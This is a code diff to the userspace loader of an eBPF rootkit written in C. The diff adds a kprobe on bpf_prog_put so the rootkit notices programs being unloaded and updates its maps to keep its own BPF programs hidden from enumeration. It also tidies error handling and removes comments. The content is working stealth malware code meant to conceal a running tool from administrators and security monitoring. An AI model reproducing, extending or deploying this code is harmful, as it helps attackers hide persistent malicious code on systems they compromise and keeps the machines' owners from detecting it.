@@ -5,7 +5,6 @@
 #include <string.h>
 #include <unistd.h>
 #include <signal.h>
-#include <errno.h>
 #include <sys/syscall.h>
 #include <sys/resource.h>
 #include <linux/bpf.h>
@@ -14,14 +13,15 @@
 #include "rootkit.h"
 
 #define END_OF_LIST 0xFFFFFFFF
-#define INITIAL_SYSTEM_PROGS_CAPACITY 256 // Start small, grow as needed
+#define INITIAL_SYSTEM_PROGS_CAPACITY 256
+#define MAX_OWN_PROGS 1024
 
-static volatile sig_atomic_t stop = 0; // Global variable that is used to stop the program when the user presses Ctrl+C
-static int hiding_map_fd = -1; // file descriptor for the hiding map
-static int jump_trigger_map_fd = -1; // file descriptor for the jump trigger map
+static volatile sig_atomic_t stop = 0;
+static int hiding_map_fd = -1;
+static int jump_trigger_map_fd = -1;
 static struct ring_buffer *ringbuf = NULL;
 
-static __u32 own_prog_ids[1024]; // Array of the EBPF program IDs we want to hide
+static __u32 own_prog_ids[MAX_OWN_PROGS];
 static int own_prog_len = 0;
 
 static __u32 *system_progs = NULL; // Dynamic array of all the running BPF programs on system
@@ -48,20 +48,19 @@ static int refresh_bpf_program_mapping(void)
     int prog_len = 0;
     
     while (bpf_prog_get_next_id(id, &id) == 0) {
-        if (prog_len >= system_prog_capacity) {
-            if (resize_system_progs() != 0)
-                return prog_len; // Return what we have so far
-        }
-        
+        if (prog_len >= system_prog_capacity && resize_system_progs() != 0)
+            return prog_len;
         system_progs[prog_len++] = id;
     }
     return prog_len;
 }
 
-static int is_hidden(__u32 prog_id) // Not done using hashmap because this will be small and therefore faster to iterate through
+static int is_hidden(__u32 prog_id)
 {
-    for (int i = 0; i < own_prog_len; i++)
-        if (own_prog_ids[i] == prog_id) return 1;
+    for (int i = 0; i < own_prog_len; i++) {
+        if (own_prog_ids[i] == prog_id)
+            return 1;
+    }
     return 0;
 }
 
@@ -76,20 +75,18 @@ static void clear_bpf_map(int map_fd)
 
 static __u32 find_next_visible_program(int start_index)
 {
-    for (int j = start_index + 1; j < system_prog_len; j++) {
-        if (!is_hidden(system_progs[j])) {
-            return system_progs[j];
-        }
+    for (int i = start_index + 1; i < system_prog_len; i++) {
+        if (!is_hidden(system_progs[i]))
+            return system_progs[i];
     }
     return END_OF_LIST;
 }
 
 static __u32 find_last_visible_program(void)
 {
-    for (int j = system_prog_len - 1; j >= 0; j--) {
-        if (!is_hidden(system_progs[j])) {
-            return system_progs[j];
-        }
+    for (int i = system_prog_len - 1; i >= 0; i--) {
+        if (!is_hidden(system_progs[i]))
+            return system_progs[i];
     }
     return 0;
 }
@@ -167,18 +164,23 @@ static struct bpf_link *load_and_hide_program(struct bpf_object *obj, const char
     return link;
 }
 
-static int handle_event(void *ctx, void *data, size_t data_sz) // Handles new event (either a new BPF program was loaded or a BPF program was unloaded)
+static int handle_event(void *ctx, void *data, size_t data_sz)
 {
-    printf("\n[!] BPF program loaded, recalculating...\n");
+    const struct event_data *evt = data;
+    
+    if (evt->action == ACTION_LOAD)
+        printf("\n[!] BPF program loaded, recalculating...\n");
+    else if (evt->action == ACTION_UNLOAD)
+        printf("\n[!] BPF program unloaded, recalculating...\n");
+    
     update_program_hiding_map();
     return 0;
 }
 
 static void ensure_program_in_ram(void)
 {
-        // The kernel cannnot directly read swap pages, so the program must be in RAM 
-        struct rlimit rlim = { RLIM_INFINITY, RLIM_INFINITY }; 
-        setrlimit(RLIMIT_MEMLOCK, &rlim); 
+    struct rlimit rlim = { RLIM_INFINITY, RLIM_INFINITY };
+    setrlimit(RLIMIT_MEMLOCK, &rlim);
 }
 
 int main(int argc, char **argv)
@@ -190,7 +192,7 @@ int main(int argc, char **argv)
     system_progs = malloc(INITIAL_SYSTEM_PROGS_CAPACITY * sizeof(__u32));
     if (!system_progs) {
         perror("Failed to allocate memory for system_progs");
-        return -1;
+        return 1;
     }
 
     ensure_program_in_ram();
@@ -213,8 +215,21 @@ int main(int argc, char **argv)
     
     struct bpf_link *link1 = load_and_hide_program(obj, "auditor_entry");
     struct bpf_link *link2 = load_and_hide_program(obj, "changer_exit");
-    if (!link1 || !link2)
+    struct bpf_link *link3 = load_and_hide_program(obj, "detect_unload");
+    
+    if (!link1 || !link2) {
+        fprintf(stderr, "Failed to attach core BPF programs\n");
+        bpf_object__close(obj);
+        free(system_progs);
         return 1;
+    }
+    
+    if (!link3) {
+        fprintf(stderr, "\n[ERROR] Failed to attach to bpf_prog_put kprobe!\n This kernel does not support hooking bpf_prog_put.\n");
+        bpf_object__close(obj);
+        free(system_progs);
+        return 1;
+    }
     
     hiding_map_fd = bpf_map__fd(bpf_object__find_map_by_name(obj, "hiding_map"));
     jump_trigger_map_fd = bpf_map__fd(bpf_object__find_map_by_name(obj, "jump_trigger_map"));
@@ -223,6 +238,8 @@ int main(int argc, char **argv)
     ringbuf = ring_buffer__new(ringbuf_fd, handle_event, NULL, NULL); // Creates a userspace polling interface for ring buffer 
     if (!ringbuf) {
         perror("Failed to create ring buffer");
+        bpf_object__close(obj);
+        free(system_progs);
         return 1;
     }
     
@@ -237,6 +254,7 @@ int main(int argc, char **argv)
     ring_buffer__free(ringbuf);
     bpf_link__destroy(link1);
     bpf_link__destroy(link2);
+    bpf_link__destroy(link3);
     bpf_object__close(obj);
     free(system_progs);
     return 0;
